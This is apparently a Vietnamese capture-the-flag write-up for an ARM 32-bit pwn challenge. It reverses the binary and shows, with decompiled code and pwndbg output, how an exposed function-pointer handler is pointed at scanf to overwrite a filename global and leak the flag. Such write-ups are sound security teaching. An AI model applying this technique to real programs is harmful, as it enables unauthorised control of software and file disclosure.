# Phân tích file

- Là 1 file arm 32bit

# Reverse file

- Run file:

```c
qemu-arm -L /usr/arm-linux-gnueabi ./challenge.elf
```

- Bài có các chức năng chính sau:
    
    ```c
    ███████╗████████╗ ██████╗ ███╗   ██╗██╗  ██╗██╗  ██╗██╗  ██╗
    ██╔════╝╚══██╔══╝██╔═══██╗████╗  ██║╚██╗██╔╝╚██╗██╔╝╚██╗██╔╝
    ███████╗   ██║   ██║   ██║██╔██╗ ██║ ╚███╔╝  ╚███╔╝  ╚███╔╝
    ╚════██║   ██║   ██║   ██║██║╚██╗██║ ██╔██╗  ██╔██╗  ██╔██╗
    ███████║   ██║   ╚██████╔╝██║ ╚████║██╔╝ ██╗██╔╝ ██╗██╔╝ ██╗
    ╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
    Welcome to the new and tops3cr3t stonkz calculator, we can show you information about old stonkz or calculate stonkz based on your assets
    What do you want to do?
    (1 will help you)
    >>>1
    
    ----------------------------------------------------------------
    | Help Menu:                                                    |
    | Each action is associated with an id                          |
    | Just give me an id and necessary values                       |
    |--------------------------------------------------------------|
    |ID     | ACTION                | PARAMS                        |
    |0      | stop                  | no params                     |
    |1      | help                  | no params                     |
    |16     | change calc           | 3 params                      |
    |32     | print stonks          | 3 params                      |
    |48     | show old stonks       | 3 params                      |
    |4919   | calc stonks           | 3 params                      |
    |--------------------------------------------------------------|
    >>>
    ```
    
- Ngoài ra còn có các case sau:
    
    ```c
    int __fastcall switch_case(int a1, int a2, int a3, int a4)
    {
      if ( !file_input )
        strncpy(&file_input, "stonks.txt", 0xBu);
      switch ( a1 )
      {
        case 1056:
          sub_10A30(1056, a2, a3, a4);
          break;
        case 4919:
          sub_10A70(4919, a2, a3, a4);
          break;
        case 16:
          sub_10ABC(16, a2, a3, a4);
          break;
        case 32:
          sub_10B38(32, a2, a3, a4);
          break;
        case 48:
          sub_10B80(48, a2, a3, a4);
          break;
        case 39321:
          sub_10CA8(39321, a2, a3, a4);
          break;
        default:
          puts("Handler does not exist");
          break;
      }
      return 0;
    }
    ```
    
- Ta thấy nó đọc file stonks.txt.
- Case 1056:
    
    ```c
    int __fastcall sub_10A30(int a1, int (*a2)())
    {
      variable = a2;
      return 0;
    }
    ```
    
    - Set variable thành địa chỉ của a2 (Tham số đầu tiên truyền vào hàm)
- Case 4919:
    
    ```c
    int __fastcall sub_10A70(int a1, int a2, int a3)
    {
      variable(a2, a3);
      return 0;
    }
    ```
    
    - Sau khi debug thì mình thấy hàm này sẽ thực hiện hàm tại a2 ở case 1056 với 2 tham số là 2 tham số đầu tiên của hàm 4919.
- Case 48:
    
    ```c
    int sub_10B80()
    {
      int v0; // r3
      FILE *stream; // [sp+14h] [bp-10h]
      _BYTE *ptr; // [sp+18h] [bp-Ch]
    
      stream = fopen(&file_input, "r");
      if ( !stream )
        return 0;
      ptr = malloc(0x28u);
      if ( !ptr )
        exit(1);
      fread(ptr, 1u, 0x28u, stream);
      ptr[39] = 0;
      printf("you already accumulated %s stonks \n", ptr);
      free(ptr);
      v0 = fclose(stream);
      if ( v0 < 0 )
        exit(1);
      return v0;
    }
    ```
    
    - Sẽ đọc file stonks.txt lúc đầu và in ra màn hình.
- Mình bỏ qua các case kia nhé, vì mình không sử dụng.

# Exploit

- Nếu ta có thể overwrite file stonks.txt thành flag.txt rồi gọi case 48 ta sẽ có flag.
- Để có thể nhập flag.txt overwrite stonks.txt ta cần cho a2 thành 1 địa chỉ của hàm nào đó để nhập, ở đây chương trình có hàm scanf.
    
    ```c
    pwndbg> u 0x107cc
     ► 0x107cc    bl     #__isoc99_scanf@plt <__isoc99_scanf@plt>
    
       0x107d0    ldr    r0, [fp, #-0x18]
       0x107d4    ldr    r1, [fp, #-0x14]
       0x107d8    ldr    r2, [fp, #-0x10]
       0x107dc    ldr    r3, [fp, #-0xc]
       0x107e0    bl     #0x108e0 <0x108e0>
    ```
    
- Mình sẽ cho tham số đầu tiên của case 1056 là địa chỉ trên, sau đó cần set 2 thanh ghi r0 và r1 lần lượt là format string (%s) và địa chỉ của file_input.
    - "%s"
        
        ```c
        pwndbg> search "%s"
        challenge.elf   0x111fc andeq  r7, r0, r5, lsr #6 /* '%s' */
        ```
        
    - file_input
        
        ```c
        0x22058 ◂— 'stonks.txt'
        ```
        
- Vậy giờ ta chỉ cần truyền 2 địa chỉ trên vào tham số 1 và 2 của case 4919, sau đó gọi case 48 được flag.
- Ta thấy địa chỉ call scanf được đưa vào variable
    
    ```c
    *R2   0x22050 —▸ 0x10828 ◂— str    fp, [sp, #-4]!
     ► 0x10a50    ldr    r3, [fp, #-0xc]
    ```
    
- Tiếp đến ta setup 2 tham số cho lần call scanf
    
    ```c
    *R0   0x111fc ◂— andeq  r7, r0, r5, lsr #6 /* '%s' */
     R1   0x22058 ◂— 'stonks.txt'
     
     ► 0x10aa4    blx    r3 <0x107cc>
    pwndbg> u 0x107cc
     ► 0x107cc    bl     #__isoc99_scanf@plt <__isoc99_scanf@plt>
    ```
    
    ```c
    ► 0x107cc    bl     #__isoc99_scanf@plt <__isoc99_scanf@plt>
    format: 0x111fc ◂— 0x7325 /* '%s' */
    vararg: 0x22058 ◂— 'stonks.txt'
    ```
    
- Ghi đè thành công
    
    ```c
    pwndbg> x/s 0x22058
    0x22058:        "flag.txt"
    ```
    
- Gọi case 48 get flag
    
    ```c
    [+] Opening connection to flu.xxx on port 20040: Done
    [*] Switching to interactive mode
    >>>you already accumulated flag{gl0bal_st0nkz_and_gl0bal_var1abl3} stonks
    >>>$
    ```
